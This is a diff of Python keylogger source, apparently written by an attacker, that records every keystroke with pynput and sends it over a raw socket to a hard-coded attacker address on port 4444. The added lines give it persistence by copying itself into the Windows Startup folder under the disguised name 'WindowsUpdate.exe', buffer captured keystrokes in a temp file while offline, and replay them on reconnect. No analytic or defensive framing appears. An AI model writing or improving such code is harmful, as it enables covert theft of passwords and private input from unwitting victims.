@@ -1,57 +1,135 @@
 from pynput import keyboard
 import socket
 import time
+import os
+import shutil
+import sys
 
-ATACANTE_IP = "10.10.10.5"
-ATACANTE_PUERTO = 4444
+IP = "10.10.10.5"
+PORT = 4444
 
-caps_lock_activo = False
+caps = False
+buff = []
+log_file = os.path.join(os.getenv('TEMP'), 'winlog.txt')
 
-def conectar():
+def persist():
+    try:
+        if getattr(sys, 'frozen', False):
+            exe_actual = sys.executable
+        else:
+            return
+        
+        startup_dir = os.path.join(
+            os.getenv('APPDATA'),
+            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
+        )
+        
+        destino = os.path.join(startup_dir, 'WindowsUpdate.exe')
+        
+        if not os.path.exists(destino):
+            os.makedirs(startup_dir, exist_ok=True)
+            shutil.copy2(exe_actual, destino)
+            
+    except:
+        pass
+
+persist()
+
+def conn():
     while True:
         try:
             s = socket.socket()
-            s.connect((ATACANTE_IP, ATACANTE_PUERTO))
+            s.settimeout(10)
+            s.connect((IP, PORT))
+            s.settimeout(None)
             return s
         except:
-            time.sleep(3)
+            time.sleep(5)
 
-conexion = conectar()
+def load():
+    global buff
+    try:
+        if os.path.exists(log_file):
+            with open(log_file, 'r', encoding='utf-8') as f:
+                contenido = f.read()
+                if contenido:
+                    buff = list(contenido)
+            os.remove(log_file)
+    except:
+        pass
 
-def al_presionar(tecla):
-    global conexion, caps_lock_activo
-    
-    # Detectar Caps Lock
-    if tecla == keyboard.Key.caps_lock:
-        caps_lock_activo = not caps_lock_activo
-        return
-    
-    letra = None
-    
-    if hasattr(tecla, 'char') and tecla.char is not None:
-        letra = tecla.char
-        if letra.isalpha():
-            letra = letra.upper() if caps_lock_activo else letra.lower()
-    else:
-        if tecla == keyboard.Key.space:
-            letra = ' '
-        elif tecla == keyboard.Key.enter:
-            letra = '\n'
-        elif tecla == keyboard.Key.tab:
-            letra = '\t'
-        elif tecla == keyboard.Key.backspace:
-            letra = '\b' 
-    
-    if letra:
-        try:
-            conexion.send(letra.encode('utf-8', errors='ignore'))
-        except:
-            conexion = conectar()
+def save(k):
+    try:
+        with open(log_file, 'a', encoding='utf-8') as f:
+            f.write(k)
+    except:
+        pass
+
+sock = None
+intentos = 0
+
+while sock is None and intentos < 3:
+    try:
+        sock = conn()
+        load()
+        if buff:
             try:
-                conexion.send(letra.encode('utf-8', errors='ignore'))
+                sock.send(''.join(buff).encode('utf-8', errors='ignore'))
+                buff = []
             except:
                 pass
+        break
+    except:
+        intentos += 1
+        time.sleep(2)
 
-listener = keyboard.Listener(on_press=al_presionar)
+def send(k):
+    global sock
+    
+    if sock:
+        try:
+            sock.send(k.encode('utf-8', errors='ignore'))
+        except:
+            sock = None
+            save(k)
+            try:
+                sock = conn()
+                load()
+                if buff:
+                    sock.send(''.join(buff).encode('utf-8', errors='ignore'))
+                    buff = []
+                sock.send(k.encode('utf-8', errors='ignore'))
+            except:
+                sock = None
+    else:
+        save(k)
+
+def on_press(key):
+    global caps
+    
+    if key == keyboard.Key.caps_lock:
+        caps = not caps
+        return
+    
+    k = None
+    
+    if hasattr(key, 'char') and key.char:
+        k = key.char
+        if k.isalpha():
+            k = k.upper() if caps else k.lower()
+    else:
+        if key == keyboard.Key.space:
+            k = ' '
+        elif key == keyboard.Key.enter:
+            k = '\n'
+        elif key == keyboard.Key.tab:
+            k = '\t'
+        elif key == keyboard.Key.backspace:
+            k = '\b'
+    
+    if k:
+        send(k)
+
+listener = keyboard.Listener(on_press=on_press)
 listener.start()
 listener.join()
